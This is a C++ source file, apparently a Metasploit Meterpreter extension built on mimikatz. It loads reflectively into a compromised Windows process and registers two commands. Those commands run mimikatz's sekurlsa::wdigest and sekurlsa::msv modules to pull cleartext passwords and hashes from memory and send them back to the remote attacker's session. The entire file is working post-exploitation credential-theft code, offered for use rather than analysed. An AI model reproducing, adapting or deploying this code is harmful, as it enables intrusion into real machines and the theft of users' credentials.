#include "main.h"

#include <iostream>
#include <fstream>
extern "C" 
{
/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com
	Licence : http://creativecommons.org/licenses/by-nc-sa/3.0/fr/
*/

#include "../../ReflectiveDLLInjection/DelayLoadMetSrv.h"
// include the Reflectiveloader() function, we end up linking back to the metsrv.dll's Init function
// but this doesnt matter as we wont ever call DLL_METASPLOIT_ATTACH as that is only used by the 
// second stage reflective dll inject payload and not the metsrv itself when it loads extensions.
#include "../../ReflectiveDLLInjection/ReflectiveLoader.c"

// this sets the delay load hook function, see DelayLoadMetSrv.h
EnableDelayLoadMetSrv();

mimikatz * myMimiKatz;

void initialize_mimikatz()
{
	vector<wstring> *args;
	if (!myMimiKatz)
	{
		args = new vector<wstring>();
		myMimiKatz = new mimikatz(args);
		delete args;
	}
}

void clear_buffer()
{
	oss.str(L""); 
	oss.clear();
}

wchar_t* convert_wstring_to_wchar_t(wstring in)
{ 
	const wchar_t* outputStr = in.c_str(); 
	wchar_t* out = new wchar_t[in.size()+1]; 
	wcscpy(out, outputStr); 
	out[in.size()] = '\0';
	return out;
}

DWORD request_wdigest(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	bool iResult = 0;

	clear_buffer();

	wstring function = (L"sekurlsa::wdigest");
	vector<wstring> *args = new vector<wstring>();

	initialize_mimikatz();
	myMimiKatz->doCommandeLocale(&function, args);
	delete args;

	wchar_t* output = convert_wstring_to_wchar_t(oss.str());
	
	clear_buffer();

	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
	packet_transmit_response(iResult, remote, response);

	return ERROR_SUCCESS;	
}

DWORD request_msv1_0(Remote *remote, Packet *packet)
{
	Packet * response = packet_create_response(packet);
	bool iResult = 0;

	clear_buffer();

	wstring function = (L"sekurlsa::msv");
	vector<wstring> *args = new vector<wstring>();

	initialize_mimikatz();
	myMimiKatz->doCommandeLocale(&function, args);
	delete args;

	wchar_t* output = convert_wstring_to_wchar_t(oss.str()); 
	
	clear_buffer();

	packet_add_tlv_raw(response, TLV_MIMIKATZ_RESULT, output, wcslen(output)*sizeof(wchar_t));
	packet_transmit_response(iResult, remote, response);

	return ERROR_SUCCESS;	
}

Command customCommands[] =
{
	{ "mimikatz_wdigest",
	  { request_wdigest,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},
	{ "mimikatz_msv1_0",
	  { request_msv1_0,                                    { 0 }, 0 },
	  { EMPTY_DISPATCH_HANDLER                                      },
	},

	// Terminator
	{ NULL,
	  { EMPTY_DISPATCH_HANDLER                      },
	  { EMPTY_DISPATCH_HANDLER                      },
	},
};

/*
 * Initialize the server extension
 */
DWORD __declspec(dllexport) InitServerExtension(Remote *remote)
{
	DWORD index;

	hMetSrv = remote->hMetSrv;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_register(&customCommands[index]);

	return ERROR_SUCCESS;
}

/*
 * Deinitialize the server extension
 */
DWORD __declspec(dllexport) DeinitServerExtension(Remote *remote)
{
	DWORD index;

	for (index = 0;
	     customCommands[index].method;
	     index++)
		command_deregister(&customCommands[index]);

	return ERROR_SUCCESS;
}
}
